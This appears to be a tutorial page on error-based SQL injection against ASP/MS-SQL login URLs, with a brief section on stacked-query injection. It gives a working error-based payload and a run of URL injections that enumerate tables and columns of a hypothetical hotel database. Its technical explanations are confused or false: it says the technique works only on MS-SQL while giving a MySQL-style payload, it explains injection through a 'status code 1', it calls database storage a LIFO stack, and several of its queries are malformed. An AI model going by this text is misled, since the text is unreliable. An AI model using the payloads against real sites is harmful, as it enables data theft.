---
id: ErrorbasedSQLinjection
title: Introduction to Error Based Injection
sidebar_label: Error Based Injection
---

Error Based Injection
============================

This type of Sql injection works only on the websites which are versed with the asp or aspx development i.e. developed by the Microsoft which implies that error based sql injection is something which works on MS-Sql not MY-SQL. 
In the Error-based SQL injection, the server does not show any data outside but it shows data in error itself. So instead of getting data on the page itself with various options, error based SQL injection gives output in Error itself.

Error Based SQL Injection works by generating a error condition in the SQL Syntax, so that the Database reverts back with the Error along with the Sensitive Data.


============================

How does AND gate works:

A    |    B    |    Resultant |
------------------------------|
0    |    0    |    0         |  ---> 0 * 0 = 0 --> False
0    |    1    |    0         |  ---> 0 * 1 = 0 --> False
1    |    0    |    0         |  ---> 1 * 0 = 0 --> False
1    |    1    |    1         |  ---> 1 * 1 = 1 --> True 




Now the point arrives why we are studying AND gates? 
We all know at the backend everything works on 0 and 1 so when a website is opened up we observe that it must have send a status code 1 in response. so what if we just add "and 1=0;" which will get and with the status code 1 i.e. true and will make it show an error.

So we make error where we havee to go for :p

here below it is given a rough estimation on how it looks like :


www.abc.com/login/login.aspx?id=10 and 1=0; 
\______________  ________________/
               \/
                1                     
--> 1 and 1=0; it is a false condition 
--> 1 and 1=1; it is a true condition (many times it wil show up the error as well.)


=x=x=x=x=x==x=x=x=x=x=x==x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x==x=x

payload -> username=gfh'+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1-- -



CONDITIONS OF ERROR BASED SQLInjection
======================================
= Only One Query can execute at a Particular time
(There should not be the like we have done in testphp.vulnweb.com where we had three vulnerable columns and we just inserted version and database to different places at the same time here you can't do that )

= It works on the basis of Last In First Out (LIFO). i.e. Stack
(Anything which is present in the database are stored in the form of stack the data inserted at the last will be opted out from the database first)

= Only the Top Table of the Database can be accessed at a single particular time. Same  goes for Columns and then for Rows.

Now lets look at the example below here we have 4 tables in a data of Hotel Mangaement System. So suppose the name of the site is www.abc.com.


DATABASE NAME : Hotel
Database Type: MS-SQL
									=============================
       						 ____{  |Cars__|__Bikes__|__CYCLES__|
     ____________________   /		|______|_________|__________|
	|					 | /		|_bmw__|__ninja__|__________|
	|		Vehicles     |<			|______|splendor_|__________|
	|____________________| \		|_Rols_|_________|__________|
	|					 |  \____   |______|_________|_Ranger___|
	|       DISHES       |       {  |______|_________|__________|
	|					 |
	|____________________|
	|					 |												
	|	    USERS	     |												
	|					 |												
	|					 |		        ============================
 	|					 |		 ____{  |Uname_|Password_|_Phone no.|
	|					 |		/		|______|_________|__________|
	|					 |	 __/		| AMY  | 1234556 |9911202912|
 	|					 | < __  		|Rohit |C@@als   |0098173723|
 	|		     		 |	   \		|Sanj  |Sanj1337 |9902132321|
  	|  					 |	    \____   |abhi  |Lucifer  |8976832132|
	|____________________|   	    {   |Vivaan|0sh0@123 |8976032212|
	|    				 |			    -----------------------------	|    				 |				
	|    				 |
	|    Room NO.		 |
	|    				 |
	|    				 |
	|____________________|    				 


Step 1 : Normal Select TOP 1 will give the first column of the first table.

WWW.abc.com/login/login.aspx?id=1 and 1=0 union select top 1 from table_name from information_schema.tables


Output --> Vehicles

Step 2: Now we dont want to excess the content of the table Vehicles then we will just EXCLUDE the table with the help of  "NOT IN" clause .

WWW.abc.com/login/login.aspx?id=1'and 1=0  union select top 1 from table_name from information_schema.tables not in ("Vehicles")
Output --> Dishes


Step 3: Now we don't want to get the content of the table name = Dishes as well so we will add this table up to the not in list.

WWW.abc.com/login/login.aspx?id=1'and 1=0  union select top 1 from table_name from information_schema.tables not in ("Vehicles","Dishes")
Output --> Users



Step 4: Now after getting inside the table name= Users we will now focus on getting the columns name as well.

WWW.abc.com/login/login.aspx?id=1 and 1=0  union select top 1 from column_name from information_schema.columns where table_name not in ("Vehicles","Dishes") --+
Output --> Uname


Step 5:
Now the last procedure is to grab the data from the database.
WWW.abc.com/login/login.aspx?id=1 and 1=0  union select top 1 from column_name from information_schema.columns where column_name not in ("Uname") and table_name not in ("Vehicles","Dishes") --+

=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x=x==x=x=x=x=x=x=


STACKED QUERY SQL INJECTION
============================

Stacked Query SQL Injection is the one which can execute by terminating the original query and adding a new one, it will be possible to modify data and call stored procedures like creating, deleting and modifying the Database with there entities.

To see the criticality of the Stacked Queries based injection lets take an example of the bank and what if a database of the bank.com is compromised and a hacker just simply drop the database i.e. if deleted the whole information then every bank user will be rushing from place to place but won't get anything.
 
This can done by SQL Injection Automated Tools like “SQLMAP” etc.

============================
